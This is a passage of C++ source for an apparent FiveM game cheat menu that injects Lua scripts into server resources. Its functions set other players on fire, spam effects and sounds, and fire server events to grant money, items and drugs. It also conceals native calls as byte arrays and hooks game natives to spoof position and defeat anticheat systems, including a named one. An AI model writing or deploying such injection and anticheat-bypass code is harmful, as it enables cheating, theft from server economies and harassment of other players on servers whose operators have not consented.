                                        StartNetworkedParticleFxNonLoopedAtCoord("exp_grub", coords.x, coords.y, coords.z, 0.0, 0.0, 0.0, 10.0, false, false, false, false)
                                    end
                                end
                            end
                            Wait(500)
                        end
                        _G.SouthWhiteScreenRunning = false
                    end)
                end
            )lua";
            ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + code + "]])", resources);
        } catch (...) {}
    }

    static void ToggleFireScreenAll(bool state) {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);
            firescreenActive = state;
            std::string code = R"lua(
                if _G.SouthFireScreen == nil then _G.SouthFireScreen = false end
                _G.SouthFireScreen = )lua" + std::string(state ? "true" : "false") + R"lua(
                if _G.SouthFireScreen and not _G.SouthFireScreenRunning then
                    _G.SouthFireScreenRunning = true
                    Citizen.CreateThread(function()
                        while _G.SouthFireScreen do
                            for _, id in ipairs(GetActivePlayers()) do
                                if id ~= PlayerId() then
                                    local ped = GetPlayerPed(id)
                                    if ped and DoesEntityExist(ped) then
                                        StartEntityFire(ped)
                                    end
                                end
                            end
                            Wait(1000)
                        end
                        _G.SouthFireScreenRunning = false
                    end)
                end
            )lua";
            ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + code + "]])", resources);
        } catch (...) {}
    }

    static void ToggleSoundSpamAll(bool state) {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);
            soundspamActive = state;
            std::string code = R"lua(
                if _G.SouthSoundSpam == nil then _G.SouthSoundSpam = false end
                _G.SouthSoundSpam = )lua" + std::string(state ? "true" : "false") + R"lua(
                if _G.SouthSoundSpam and not _G.SouthSoundSpamRunning then
                    _G.SouthSoundSpamRunning = true
                    Citizen.CreateThread(function()
                        while _G.SouthSoundSpam do
                            PlaySoundFrontend(-1, "BASE_JUMP_PASSED", "HUD_AWARDS", true)
                            Wait(100)
                        end
                        _G.SouthSoundSpamRunning = false
                    end)
                end
            )lua";
            ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + code + "]])", resources);
        } catch (...) {}
    }

    static void TogglePickupVehicles(bool state) {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);
            pickupVehiclesActive = state;
            std::string code = R"lua(
                if _G.SouthPickupVehicles == nil then _G.SouthPickupVehicles = false end
                _G.SouthPickupVehicles = )lua" + std::string(state ? "true" : "false") + R"lua(
                if _G.SouthPickupVehicles and not _G.SouthPickupVehiclesRunning then
                    _G.SouthPickupVehiclesRunning = true
                    Citizen.CreateThread(function()
                        while _G.SouthPickupVehicles do
                            local ped = PlayerPedId()
                            if IsControlJustPressed(0, 38) then -- E key
                                local vehicle = GetClosestVehicle(GetEntityCoords(ped), 5.0, 0, 70)
                                if vehicle and vehicle ~= 0 then
                                    if not IsEntityAttachedToEntity(vehicle, ped) then
                                        AttachEntityToEntity(vehicle, ped, GetPedBoneIndex(ped, 0), 0.0, 0.0, 2.0, 0.0, 0.0, 0.0, false, false, false, false, 0, true)
                                    else
                                        DetachEntity(vehicle, true, true)
                                        local forward = GetEntityForwardVector(ped)
                                        ApplyForceToEntity(vehicle, 1, forward.x * 50.0, forward.y * 50.0, forward.z * 10.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
                                    end
                                end
                            end
                            Wait(0)
                        end
                        _G.SouthPickupVehiclesRunning = false
                    end)
                end
            )lua";
            ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + code + "]])", resources);
        } catch (...) {}
    }

    static void ExecuteTriggerAction(const std::string& type) {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);
            std::string code;
            if (type == "Money Wash") {
                code = "TriggerServerEvent('tm-moneywash:giveCleanMoney', 100000)";
            } else if (type == "Printer Money") {
                code = "TriggerServerEvent('waytoocerti_3dprinter:CompletePurchase', 'money', 10000)";
            } else if (type == "Drug Reward") {
                code = "TriggerServerEvent('ak47_drugmanager:pickedupitem', 'money', 'money', 10000)";
            } else if (type == "Gain Item") {
                code = "TriggerServerEvent('angelicxs-CivilianJobs:Server:GainItem', 'cash', 10000)";
            } else if (type == "Spawn Money") {
                code = "TriggerServerEvent('esx_vehicleaddon:givemoney', 50000) TriggerServerEvent('esx_garbagejob:pay', 50000)";
            } else if (type == "Spawn All Item") {
                code = "TriggerServerEvent('esx_policejob:handcuff') TriggerServerEvent('esx_ambulancejob:heal', 'health')";
            } else if (type == "Lashes") {
                code = "TriggerServerEvent('delivery:giveRewardlashes', 10000)";
            } else if (type == "Nails") {
                code = "TriggerServerEvent('delivery:giveRewardnails', 10000)";
            } else if (type == "Caps") {
                code = "TriggerServerEvent('delivery:giveRewardCaps', 10000)";
            } else if (type == "Wigs") {
                code = "TriggerServerEvent('delivery:giveRewardWigss', 10000)";
            } else if (type == "Icebox") {
                code = "TriggerServerEvent('delivery:giveRewardiceboxs', 10000)";
            } else if (type == "Sneaker") {
                code = "TriggerServerEvent('delivery:giveRewardShoes', 10000)";
            } else if (type == "Handbag") {
                code = "TriggerServerEvent('delivery:giveRewardhandbags', 10000)";
            } else if (type == "Spoody Sim") {
                code = R"lua(
                    for i = 1, 30 do
                        TriggerServerEvent('spoodyFraud:interactionComplete', 'Swapped Sim Card')
                        Citizen.Wait(5)
                    end
                )lua";
            } else if (type == "Spoody Clone") {
                code = R"lua(
                    for i = 1, 30 do
                        TriggerServerEvent('spoodyFraud:interactionComplete', 'Cloned Card')
                        Citizen.Wait(5)
                        TriggerServerEvent('spoodyFraud:attemptSellProduct', 'Pacific Bank', 'clone')
                        TriggerServerEvent('spoodyFraud:attemptSellProduct', 'Sandy Shoes', 'sim')
                    end
                )lua";
            } else if (type == "Drug Receive") {
                code = R"lua(
                    TriggerServerEvent('drugs:receive', {
                        Reward = {
                            Name = "coke",
                            Amount = 10
                        }
                    })
                )lua";
            } else if (type == "Set Chat Tag") {
                code = R"lua(
                    LocalPlayer.state:set('currentChatTag', { tag = "Developer", color = "0, 255, 0" }, true)
                )lua";
            }

            if (!code.empty()) {
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + code + "]])", resources);
            }
        } catch (...) {}
    }

    static void SetHealthLua(float val) {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);
            char buf[64]; sprintf_s(buf, "%.2f", val);

            std::string script = 
                "local function _d(t) local s = '' for i = 1, #t do s = s .. string.char(t[i]) end return s end\n"
                "local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end\n"
                "_g({67,114,101,97,116,101,84,104,114,101,97,100})(function()\n"
                "  local p = _g({80,108,97,121,101,114,80,101,100,73,100})()\n"
                "  local exists_fn = _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})\n"
                "  if p and p ~= 0 and exists_fn(p) then\n"
                "    local v = " + std::string(buf) + "\n"
                "    local max_fn = _g({71,101,116,69,110,116,105,116,121,77,97,120,72,101,97,108,116,104})\n"
                "    local set_fn = _g({83,101,116,69,110,116,105,116,121,72,101,97,108,116,104})\n"
                "    local wait_fn = _g({87,97,105,116})\n"
                "    for i=1, 20 do\n"
                "      if exists_fn(p) then\n"
                "        local m = max_fn(p)\n"
                "        set_fn(p, math.floor((v/100.0)*m))\n"
                "      end\n"
                "      wait_fn(50)\n"
                "    end\n"
                "  end\n"
                "end)";

            ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + script + "]])", resources);
        } catch (...) {}
    }

    static void SetArmourLua(float val) {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);
            char buf[64]; sprintf_s(buf, "%.2f", val);

            std::string script = 
                "local function _d(t) local s = '' for i = 1, #t do s = s .. string.char(t[i]) end return s end\n"
                "local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end\n"
                "_g({67,114,101,97,116,101,84,104,114,101,97,100})(function()\n"
                "  local p = _g({80,108,97,121,101,114,80,101,100,73,100})()\n"
                "  local exists_fn = _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})\n"
                "  if p and p ~= 0 and exists_fn(p) then\n"
                "    local v = " + std::string(buf) + "\n"
                "    local set_fn = _g({83,101,116,80,101,100,65,114,109,111,117,114})\n"
                "    local wait_fn = _g({87,97,105,116})\n"
                "    for i=1, 20 do\n"
                "      if exists_fn(p) then\n"
                "        set_fn(p, math.floor(v))\n"
                "      end\n"
                "      wait_fn(50)\n"
                "    end\n"
                "  end\n"
                "end)";

            ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + script + "]])", resources);
        } catch (...) {}
    }

    static void ApplyFakeBandage() {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);

            std::string script = 
                "local function _d(t) local s = '' for i = 1, #t do s = s .. string.char(t[i]) end return s end\n"
                "local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end\n"
                "_g({67,114,101,97,116,101,84,104,114,101,97,100})(function()\n"
                "  if _G.fakeBandageActive then return end\n"
                "  _G.fakeBandageActive = true\n"
                "  local p = _g({80,108,97,121,101,114,80,101,100,73,100})()\n"
                "  local exists_fn = _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})\n"
                "  local dead_fn = _g({73,115,69,110,116,105,116,121,68,101,97,100})\n"
                "  local anim_fn = _g({84,97,115,107,80,108,97,121,65,110,105,109})\n"
                "  local req_fn = _g({82,101,113,117,101,115,116,65,110,105,109,68,105,99,116})\n"
                "  local loaded_fn = _g({72,97,115,65,110,105,109,68,105,99,116,76,111,97,100,101,100})\n"
                "  local clear_fn = _g({67,108,101,97,114,80,101,100,84,97,115,107,115})\n"
                "  local timer_fn = _g({71,101,116,71,97,109,101,84,105,109,101,114})\n"
                "  local wait_fn = _g({87,97,105,116})\n"
                "\n"
                "  if p and p ~= 0 and exists_fn(p) then\n"
                "    local dict = 'amb@world_human_clipboard@male@idle_a'\n"
                "    req_fn(dict)\n"
                "    local timeout = timer_fn() + 3000\n"
                "    while not loaded_fn(dict) and timer_fn() < timeout do wait_fn(0) end\n"
                "\n"
                "    if loaded_fn(dict) then\n"
                "      anim_fn(p, dict, 'idle_c', 4.0, -4.0, 5000, 51, 0, false, false, false)\n"
                "    end\n"
                "\n"
                "    local finish = timer_fn() + 5000\n"
                "    while timer_fn() < finish do\n"
                "      if dead_fn(p) then\n"
                "        clear_fn(p)\n"
                "        _G.fakeBandageActive = false\n"
                "        return\n"
                "      end\n"
                "      wait_fn(0)\n"
                "    end\n"
                "\n"
                "    local hp_fn = _g({71,101,116,69,110,116,105,116,121,72,101,97,108,116,104})\n"
                "    local set_hp_fn = _g({83,101,116,69,110,116,105,116,121,72,101,97,108,116,104})\n"
                "    if hp_fn and set_hp_fn then\n"
                "      local hp = hp_fn(p)\n"
                "      local healed = math.min(hp + 100, 200)\n"
                "      set_hp_fn(p, healed)\n"
                "    end\n"
                "    clear_fn(p)\n"
                "  end\n"
                "  _G.fakeBandageActive = false\n"
                "end)";

            ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + script + "]])", resources);
        } catch (...) {}
    }

    static void ApplyFakeArmour() {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);

            std::string script = 
                "local function _d(t) local s = '' for i = 1, #t do s = s .. string.char(t[i]) end return s end\n"
                "local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end\n"
                "_g({67,114,101,97,116,101,84,104,114,101,97,100})(function()\n"
                "  if _G.fakeArmorActive then return end\n"
                "  _G.fakeArmorActive = true\n"
                "  local p = _g({80,108,97,121,101,114,80,101,100,73,100})()\n"
                "  local exists_fn = _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})\n"
                "  local dead_fn = _g({73,115,69,110,116,105,116,121,68,101,97,100})\n"
                "  local anim_fn = _g({84,97,115,107,80,108,97,121,65,110,105,109})\n"
                "  local req_fn = _g({82,101,113,117,101,115,116,65,110,105,109,68,105,99,116})\n"
                "  local loaded_fn = _g({72,97,115,65,110,105,109,68,105,99,116,76,111,97,100,101,100})\n"
                "  local clear_fn = _g({67,108,101,97,114,80,101,100,84,97,115,107,115})\n"
                "  local timer_fn = _g({71,101,116,71,97,109,101,84,105,109,101,114})\n"
                "  local wait_fn = _g({87,97,105,116})\n"
                "\n"
                "  if p and p ~= 0 and exists_fn(p) then\n"
                "    local dict = 'clothingtie'\n"
                "    req_fn(dict)\n"
                "    local timeout = timer_fn() + 3000\n"
                "    while not loaded_fn(dict) and timer_fn() < timeout do wait_fn(0) end\n"
                "\n"
                "    if loaded_fn(dict) then\n"
                "      anim_fn(p, dict, 'try_tie_positive_a', 4.0, -4.0, 3000, 51, 0, false, false, false)\n"
                "    end\n"
                "\n"
                "    local finish = timer_fn() + 5000\n"
                "    while timer_fn() < finish do\n"
                "      if dead_fn(p) then\n"
                "        clear_fn(p)\n"
                "        _G.fakeArmorActive = false\n"
                "        return\n"
                "      end\n"
                "      wait_fn(0)\n"
                "    end\n"
                "\n"
                "    local arm_fn = _g({83,101,116,80,101,100,65,114,109,111,117,114})\n"
                "    if arm_fn then\n"
                "      arm_fn(p, 100)\n"
                "    end\n"
                "    clear_fn(p)\n"
                "  end\n"
                "  _G.fakeArmorActive = false\n"
                "end)";

            ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + script + "]])", resources);
        } catch (...) {}
    }

    static void ApplyFakeDeath() {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);

            std::string script = 
                "local function _d(t) local s = '' for i = 1, #t do s = s .. string.char(t[i]) end return s end\n"
                "local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end\n"
                "_g({67,114,101,97,116,101,84,104,114,101,97,100})(function()\n"
                "  local p = _g({80,108,97,121,101,114,80,101,100,73,100})()\n"
                "  local exists_fn = _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})\n"
                "  local dead_fn = _g({73,115,69,110,116,105,116,121,68,101,97,100})\n"
                "  local ignore_player_fn = _g({83,101,116,69,118,101,114,121,111,110,101,73,103,110,111,114,101,80,108,97,121,101,114})\n"
                "  local pid_fn = _g({80,108,97,121,101,114,73,100})\n"
                "  if p and p ~= 0 and exists_fn(p) and not dead_fn(p) then\n"
                "    if ignore_player_fn and pid_fn then\n"
                "      ignore_player_fn(pid_fn(), true)\n"
                "    end\n"
                "    local dict = 'dead'\n"
                "    local req_fn = _g({82,101,113,117,101,115,116,65,110,105,109,68,105,99,116})\n"
                "    local loaded_fn = _g({72,97,115,65,110,105,109,68,105,99,116,76,111,97,100,101,100})\n"
                "    local anim_fn = _g({84,97,115,107,80,108,97,121,65,110,105,109})\n"
                "    local timer_fn = _g({71,101,116,71,97,109,101,84,105,109,101,114})\n"
                "    local wait_fn = _g({87,97,105,116})\n"
                "    req_fn(dict)\n"
                "    local timeout = timer_fn() + 3000\n"
                "    while not loaded_fn(dict) and timer_fn() < timeout do wait_fn(0) end\n"
                "    if loaded_fn(dict) then\n"
                "      anim_fn(p, dict, 'dead_a', 8.0, -8.0, -1, 1, 0, false, false, false)\n"
                "    else\n"
                "      _g({83,101,116,80,101,100,84,111,82,97,103,100,111,108,108})(p, 10000, 10000, 0, false, false, false)\n"
                "    end\n"
                "    \n"
                "    local check_anim_fn = _g({73,115,69,110,116,105,116,121,80,108,97,121,105,110,103,65,110,105,109})\n"
                "    while true do\n"
                "      wait_fn(500)\n"
                "      p = _g({80,108,97,121,101,114,80,101,100,73,100})()\n"
                "      if not exists_fn(p) or dead_fn(p) then break end\n"
                "      if check_anim_fn and not check_anim_fn(p, dict, 'dead_a', 3) then\n"
                "        break\n"
                "      end\n"
                "    end\n"
                "    \n"
                "    if ignore_player_fn and pid_fn then\n"
                "      ignore_player_fn(pid_fn(), false)\n"
                "    end\n"
                "  end\n"
                "end)";

            ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + script + "]])", resources);
        } catch (...) {}
    }

    static void ToggleFastRun(bool state) {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);

            if (state) {
                std::string code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    if _G.SouthFastRun == nil then _G.SouthFastRun = false end
                    if _G.SouthFastRunThreadRunning == nil then _G.SouthFastRunThreadRunning = false end
                    _G.SouthFastRun = true

                    if not _G.SouthFastRunThreadRunning then
                        _G.SouthFastRunThreadRunning = true
                        local function initFlow(cb)
                            local co = coroutine.create(cb)
                            local wait_fn = _g({87,97,105,116})
                            CreateThread(function()
                                while coroutine.status(co) ~= "dead" do
                                    local ok, err = coroutine.resume(co)
                                    if not ok then break end
                                    wait_fn(0)
                                end
                            end)
                        end

                        initFlow(function()
                            local pid_fn = _g({80,108,97,121,101,114,73,100})
                            local pped_fn = _g({80,108,97,121,101,114,80,101,100,73,100})
                            local setRunMult = _g({83,101,116,82,117,110,83,112,114,105,110,116,77,117,108,116,105,112,108,105,101,114,70,111,114,80,108,97,121,101,114})
                            local setMoveRate = _g({83,101,116,80,101,100,77,111,118,101,82,97,116,101,79,118,101,114,114,105,100,101})
                            local wait_fn = _g({87,97,105,116})

                            while _G.SouthFastRun do
                                local p = pped_fn()
                                if p and p ~= 0 then
                                    setRunMult(pid_fn(), 1.49)
                                    setMoveRate(p, 1.49)
                                end
                                wait_fn(0)
                            end
                            setRunMult(pid_fn(), 1.0)
                            setMoveRate(pped_fn(), 1.0)
                            _G.SouthFastRunThreadRunning = false
                        end)
                    end
                )lua";
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + code + "]])", resources);
            } else {
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[ _G.SouthFastRun = false ]])", resources);
            }
        } catch (...) {}
    }

    static void ToggleSuperJump(bool state) {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);

            if (state) {
                std::string code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    if _G.SouthSuperJump == nil then _G.SouthSuperJump = false end
                    if _G.SouthSuperJumpThreadRunning == nil then _G.SouthSuperJumpThreadRunning = false end
                    _G.SouthSuperJump = true

                    if not _G.SouthSuperJumpThreadRunning then
                        _G.SouthSuperJumpThreadRunning = true
                        local function initFlow(cb)
                            local co = coroutine.create(cb)
                            local wait_fn = _g({87,97,105,116})
                            CreateThread(function()
                                while coroutine.status(co) ~= "dead" do
                                    coroutine.resume(co)
                                    wait_fn(0)
                                end
                            end)
                        end

                        initFlow(function()
                            local pid_fn = _g({80,108,97,121,101,114,73,100})
                            local setJump_fn = _g({83,101,116,83,117,112,101,114,74,117,109,112,84,104,105,115,70,114,97,109,101})
                            local wait_fn = _g({87,97,105,116})

                            while _G.SouthSuperJump do
                                setJump_fn(pid_fn())
                                wait_fn(0)
                            end
                            _G.SouthSuperJumpThreadRunning = false
                        end)
                    end
                )lua";
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + code + "]])", resources);
            } else {
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[ _G.SouthSuperJump = false ]])", resources);
            }
        } catch (...) {}
    }

    static void ExecuteSelfCrash() {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);
            std::string code = R"lua(
                function SimpleJsonEncode(v) if type(v)=="table" then return "{}" elseif type(v)=="string" then return '"'..v..'"' else return tostring(v) end end
                _G['TriggerEvent'] = function() while true do end end
                _G['TriggerServerEvent'] = function() while true do end end
            )lua";
            ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + code + "]])", resources);
        } catch (...) {}
    }

    static void ExecuteSuicide() {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);
            ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[ SetEntityHealth(PlayerPedId(), 0) ]])", resources);
        } catch (...) {}
    }

    static void ExecuteForceRagdoll() {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);
            ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[ SetPedToRagdoll(PlayerPedId(), 3000, 3000, 0, false, false, false) ]])", resources);
        } catch (...) {}
    }

    static void StopWasabiCrutch() {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            ::ProcessMachoCommands("MachoResourceStop(\"wasabi_crutch\")", resources);
        } catch (...) {}
    }

    static void ClearScreenEffects() {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);

            ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[ AnimpostfxStopAll() ClearScreenblurFade() SetTransitionOutFinished() ]])", resources);
        } catch (...) {}
    }

    static void ExecuteClearTasks(bool primary) {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);
            std::string code = primary ? "ClearPedTasksImmediately(PlayerPedId())" : "ClearPedSecondaryTask(PlayerPedId())";
            ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + code + "]])", resources);
        } catch (...) {}
    }

    static std::string GetNoclipLuaScript(bool isWS, float speed, int mode) {
        char sBuf[32]; 
        sprintf_s(sBuf, "%.2f", speed);
        char mBuf[32]; 
        sprintf_s(mBuf, "%d", mode);

        std::string code = R"lua(

            -- Store original natives
            if not _G.originalGetEntityCoords then
                _G.originalGetEntityCoords = GetEntityCoords
                _G.originalGetEntityHeading = GetEntityHeading
                _G.originalIsControlPressed = IsControlPressed
                _G.originalGetEntityRotation = GetEntityRotation
                _G.originalGetEntityPitch = GetEntityPitch
                _G.originalGetEntityRoll = GetEntityRoll
                _G.originalIsPedFalling = IsPedFalling
                _G.originalGetPedParachuteState = GetPedParachuteState
                _G.originalIsPedJumpingOutOfVehicle = IsPedJumpingOutOfVehicle
                _G.originalNetworkHasControlOfEntity = NetworkHasControlOfEntity

                _G.originalGetEntitySpeed = GetEntitySpeed
                _G.originalGetEntitySpeedVector = GetEntitySpeedVector
                _G.originalSetEntityVelocity = SetEntityVelocity
                _G.originalSetEntityCoordsNoOffset = SetEntityCoordsNoOffset

                _G.originalGetEntityCoordsNoOffset = GetEntityCoordsNoOffset
                _G.originalGetDistanceBetweenCoords = GetDistanceBetweenCoords
                _G.originalGetInteriorFromEntity = GetInteriorFromEntity
                _G.originalGetZoneAtCoords = GetZoneAtCoords

                _G.originalIsEntityVisible = IsEntityVisible
                _G.originalSetEntityVisible = SetEntityVisible
                _G.originalSetEntityCollision = SetEntityCollision
                _G.originalFreezeEntityPosition = FreezeEntityPosition
            end

            local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
            local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

            -- Cache values to prevent nested InvokeNative calls
            _G.myPedCache = _G.myPedCache or PlayerPedId()
            _G.myPlayerIdCache = _G.myPlayerIdCache or PlayerId()

            -- Global hooks if native hooker is available (to bypass all anticheat resources)
            local _hook = _G[_d({77,97,99,104,111,72,111,111,107,78,97,116,105,118,101})] or (_ENV and _ENV[_d({77,97,99,104,111,72,111,111,107,78,97,116,105,118,101})])
            if _hook then
                pcall(function()
                    _hook("IsEntityVisible", function(orig, entity)
                        if _G._0x_nc and (invisible_noclip_mode == 1 or invisible_noclip_mode == 2) and entity == (_G.myPedCache or PlayerPedId()) then return true end
                        return orig(entity)
                    end)
                    _hook("GetEntityAlpha", function(orig, entity)
                        if _G._0x_nc and (invisible_noclip_mode == 1 or invisible_noclip_mode == 2) and entity == (_G.myPedCache or PlayerPedId()) then return 255 end
                        return orig(entity)
                    end)
                    _hook("NetworkIsPlayerConcealed", function(orig, player)
                        if _G._0x_nc and (invisible_noclip_mode == 1 or invisible_noclip_mode == 2) and player == (_G.myPlayerIdCache or PlayerId()) then return false end
                        return orig(player)
                    end)
                    -- Teleport & Freecam Bypass hooks
                    _hook(0xE3B6097CC25AA69E, function(ped) -- IsPedRunningRagdollTask
                        return false, true
                    end)
                    if GetResourceState("WaveShield") == "started" then
                        _hook(0xD3C2E180A40F031E, function()
                            return false, true
                        end)
                        _hook(0xE18B138FABC53103, function() -- IsWarningMessageActive()
                            return false, true
                        end)
                        _hook(0x81DF9ABA6C83DFF9, function(caller) -- GetWarningMessageTitleHash()
                            return false, 1246147334
                        end)
                        _hook(0x3317DEDB88C95038, function(ped, checkMeleeDeathFlags) -- IsPedDeadOrDying
                            if ped == PlayerPedId() then
                                return false, true
                            end
                            return true
                        end)
                    end
                    _hook(0x1DD55701034110E5, function(ped) -- GetEntityHeightAboveGround
                        if ped == PlayerPedId() then
                            return false, 1.0
                        end
                        return true, GetEntityHeightAboveGround(ped)
                    end)
                    _hook(0x831E0242595560DF, function(entity) -- GetEntityRoll
                        return false, 0.0
                    end)
                    _hook(0x8E3222B7, function(entity) -- GetEntityHealth
                        return false, 0
                    end)
                    _hook(0x67722AEB798E5FAB, function(ped) -- IsPedOnVehicle
                        if ped == PlayerPedId() then
                            return false, true
                        end
                        return true, IsPedOnVehicle(ped)
                    end)

                    local safeStateNatives = {
                        [0x01FEE67DB37F59B2] = true, -- IsPedOnFoot
                        [0x9DE327631295B4C2] = true, -- IsPedSwimming
                        [0xC024869A53992F34] = true, -- IsPedSwimmingUnderWater
                        [0x433DDFFE2044B636] = true, -- IsPedJumpingOutOfVehicle
                        [0x53E8CB4F48BFE623] = true, -- IsPedClimbing
                        [0xCEDABC5900A0BF97] = true  -- IsPedJumping
                    }
                    for hash in pairs(safeStateNatives) do
                        _hook(hash, function(ped)
                            if ped == PlayerPedId() then
                                return false, false
                            end
                            return true, Citizen.InvokeNative(hash, ped)
                        end)
                    end
                end)
            end

            -- Cryptic Helper
            local function _h_n_(n, o, f)
                if _G[n.."_hk"] then return end
                _G[n] = function(...) return f(o, ...) end
                _G[n.."_hk"] = true
            end

            local function _s_v_(x, y, z)
                return vector3(x or 0.0, y or 0.0, z or 0.0)
            end

            -- Static cache table for blocked controls to avoid constant memory allocation in hooks
            local _blocked_ctrls = { [32]=true, [33]=true, [34]=true, [9]=true, [22]=true, [36]=true, [21]=true, [19]=true }

            -- ========== HOOK NATIVES FOR BYPASS ==========
            if not _G.nativesHooked then
                pcall(function()
                -- Spoof coordinates with micro jitter safely
                _h_n_("GetEntityCoords", _G.originalGetEntityCoords, function(orig, entity)
                    if _G._0x_nc then
                        local ped = _G.myPedCache or PlayerPedId()
                        if entity == ped then
                            local p1, p2, p3 = orig(ped)
                            if p1 then
                                local x, y, z
                                if type(p1) == 'vector3' then
                                    x, y, z = p1.x, p1.y, p1.z
                                elseif type(p1) == 'table' and p1.x then
                                    x, y, z = p1.x, p1.y, p1.z
                                else
                                    x, y, z = p1, p2, p3
                                end

                                if x and y and z then
                                    -- More natural micro-jitter (simulates network breathing)
                                    local r = (math.random() - 0.5) * 0.004
                                    return _s_v_(x + r, y + r, z + (math.random() * 0.002))
                                end
                            end
                        end
                    end
                    return orig(entity)
                end)

                -- Spoof heading safely
                _h_n_("GetEntityHeading", _G.originalGetEntityHeading, function(orig, entity)
                    if _G._0x_nc then
                        local ped = _G.myPedCache or PlayerPedId()
                        if entity == ped then
                            return orig(ped) + (math.random() - 0.5) * 0.3
                        end
                    end
                    return orig(entity)
                end)

                -- Block movement control detection safely without constant table allocations
                _h_n_("IsControlPressed", _G.originalIsControlPressed, function(orig, group, control)
                    if _G._0x_nc and _blocked_ctrls[control] then
                        return false
                    end
                    return orig(group, control)
                end)

                -- Spoof rotation safely
                _h_n_("GetEntityRotation", _G.originalGetEntityRotation, function(orig, entity)
                    if _G._0x_nc then
                        local ped = _G.myPedCache or PlayerPedId()
                        if entity == ped then
                            return vector3(0.0, 0.0, _G.originalGetEntityHeading(ped))
                        end
                    end
                    return orig(entity)
                end)

                 _h_n_("GetEntityPitch", _G.originalGetEntityPitch, function(orig, entity)
                    if _G._0x_nc then
                        local ped = _G.myPedCache or PlayerPedId()
                        if entity == ped then
                            return false, 0.0
                        end
                    end
                    return orig(entity)
                end)

                _h_n_("GetEntityRoll", _G.originalGetEntityRoll, function(orig, entity)
                    if _G._0x_nc then
                        local ped = _G.myPedCache or PlayerPedId()
                        if entity == ped then
                            return false, 0.0
                        end
                    end
                    return orig(entity)
                end)

                -- Anti-cheat specific hooks safely
